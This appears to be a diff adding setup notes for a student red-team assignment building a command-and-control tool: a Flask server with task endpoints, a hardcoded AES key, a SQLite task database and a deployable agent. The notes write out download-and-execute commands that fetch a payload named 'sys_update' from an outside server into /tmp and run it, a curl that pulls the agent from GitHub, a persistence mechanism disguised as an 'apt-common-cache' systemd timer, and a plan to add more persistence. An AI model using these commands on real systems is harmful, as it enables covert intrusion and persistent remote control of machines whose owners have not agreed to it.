@@ -1,0 +1,55 @@
+Here is what I have so far:
+
+server.py - Creates a basic flask instance with three simple endpoints:
+(paths need an agent ID at the end)
+    /get_task/
+    /post_result/
+    /set_task/
+
+AES Encryption, symmetric key is hardcoded,
+SQLite database for tracking commands, outputs, and agents
+
+Dependencies:
+    Server:
+        python
+        flask
+        pycryptodome
+        sqlite (should be already in python)
+    Agent:
+        python
+        pycryptodome
+        (should be zero if compiled)
+
+TODO:
+- Implement pyinstaller to send compiled binary instead
+- Add (way) more persistence mechanisms for payload
+
+Test IP: 100.65.6.27
+
+Payload Command: curl -L https://raw.githubusercontent.com/polrVortex/CDT-RedTeam-Assignment/main/agent.py > payload.py
+
+Kill persistence in target:
+sudo systemctl stop apt-common-cache.timer && sudo rm /etc/systemd/system/apt-common*
+
+How to bring down payload from github:
+(Copy from python server running on ubuntu )
+    curl -sL http://100.65.3.15:8000/sys_update -o /tmp/sys_update && chmod +x /tmp/sys_update && /tmp/sys_update
+    wget -q http://100.65.3.15:8000/sys_update -o /tmp/sys_update && chmod +x /tmp/sys_update && /tmp/sys_update
+
+List results from tables:
+sqlite3 c2.db "SELECT id, agent_id, command, status, result FROM tasks;" -header -column
+id  agent_id   command  status     result 
+
+
+
+DAY 1 COMMANDS
+
+Install dependencies:
+    sudo apt install -y python3 python3-full sqlite3 flask
+    /usr/bin/python3 -m pip install pycryptodome --break-system-packages
+
+Create python server for sending payload:
+    python3 -m http.server 8000
+
+Curl payolad from c2 server:
+    curl -sL http://100.65.3.15:8000/sys_update -o /tmp/sys_update && chmod +x /tmp/sys_update && /tmp/sys_update
